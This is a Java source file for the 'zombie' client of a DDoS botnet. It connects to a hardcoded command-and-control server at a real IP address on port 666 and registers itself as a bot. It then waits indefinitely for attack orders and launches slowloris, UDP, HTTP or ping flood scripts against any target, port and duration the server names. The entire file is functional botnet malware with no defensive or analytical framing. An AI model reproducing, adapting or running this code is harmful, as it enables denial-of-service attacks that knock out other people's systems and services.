/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ddoszombie;

import ddos_util.Attack;
import ddos_util.Identifier;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.net.Socket;

/**
 *
 * @author karol
 */
public class DdosZombie {

    public static String FILE_SLOWLORIS = "slowloris.py";
    public static String FILE_UDP_FLOOD = "udpflood.py";
    public static String FILE_HTTP_FLOOD = "httpflood.py";
    public static String FILE_PING_FLOOD = "pingflood.py";
    
    private final static String HOST_IP = "159.203.32.136";
    private final static int HOST_PORT = 666;
    
    private ObjectInputStream in;
    
    public void connect(){
        System.out.println("Combie attempting to connect to host");
        
        try{
            //Connect to host
            Socket socket = new Socket(HOST_IP,HOST_PORT);
            ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());
            in = new ObjectInputStream(socket.getInputStream());
        
            System.out.println("Connected to host, sending ZOMBIE identifier");
            
            //Send ZOMBIE identifier
            Identifier identifier = new Identifier(Identifier.ZOMBIE);
            out.writeObject(identifier);

            System.out.println("Identifier successfully sent");
        }
        catch(Exception e){
            e.printStackTrace();
        }
    }
    
    //Listen for attacks and execute them as they come
    public void start(){
        while(true){
            System.out.println("ZOMBIE listening for attack");

            //Listen for attack from server
            Attack a = null;
            try{
                a = (Attack)in.readObject();
            }
            catch(Exception e){
                e.printStackTrace();
                System.exit(0);
            }

            System.out.println("ZOMBIE received attack: "+a.toString());
            
            try{
                //Execute attack script
                switch(a.getAttackType()){
                    
                    case Attack.TYPE_HTTP_FLOOD:
                        Runtime.getRuntime().exec(getArgs(FILE_HTTP_FLOOD, a));
                        break;

                    case Attack.TYPE_PING_FLOOD:
                        Runtime.getRuntime().exec(getArgs(FILE_PING_FLOOD, a));
                        break;

                    case Attack.TYPE_SLOWLORIS:
                        Runtime.getRuntime().exec(getArgs(FILE_SLOWLORIS, a));
                        break;

                    case Attack.TYPE_UDPFLOOD:
                        Runtime.getRuntime().exec(getArgs(FILE_UDP_FLOOD, a));
                        break;
                }
                
                System.out.println("Zombie executed attack script.");
            }
            catch(IOException e){
                e.printStackTrace();
                System.exit(0);
            }
            
        }
    }
    
    public String[] getArgs(String fileName, Attack a){
        String[] cmd = {
            "python",
            fileName,
            a.getIpAddress(),
            Integer.toString(a.getPort()),
            Integer.toString(a.getDuration())
        };
        
        return cmd;
    }
    
    public static void main(String[] args) {
        DdosZombie zombie = new DdosZombie();
        zombie.connect();
        zombie.start();
    }
    
}
